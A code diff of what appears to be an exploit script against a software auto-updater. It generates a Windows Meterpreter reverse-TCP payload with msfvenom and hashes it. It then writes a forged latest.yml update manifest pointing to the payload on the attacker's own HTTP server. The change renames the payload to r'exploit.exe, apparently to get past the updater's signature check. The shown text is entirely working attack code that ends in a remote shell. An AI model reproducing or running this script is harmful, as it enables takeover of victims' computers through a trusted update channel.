@@ -27,13 +27,13 @@ lhost = sys.argv[1]
 lport = sys.argv[2]
 
 
-metasploit_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o \"exploit.exe\""
+metasploit_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o \"r'exploit.exe\""
 
 if os.getuid() != 0:
 
     metasploit_cmd = "sudo "+metasploit_cmd
 
-key_cmd = "shasum -a 512 \"exploit.exe\" | cut -d \" \" -f1 | xxd -r -p | base64 -w 0"
+key_cmd = "shasum -a 512 \"r'exploit.exe\" | cut -d \" \" -f1 | xxd -r -p | base64 -w 0"
 
 os.system(metasploit_cmd)
 key = subprocess.getoutput(key_cmd)
@@ -80,7 +80,7 @@ os.system("touch latest.yml")
 f = open("latest.yml","w")
 
 f.write("version: 1.2.3\n")
-f.write(f"path: http://{lhost}:{server_port}/exploit.exe\n")
+f.write(f"path: http://{lhost}:{server_port}/r'exploit.exe\n")
 f.write(f"sha512: {key}")
 f.close()
 
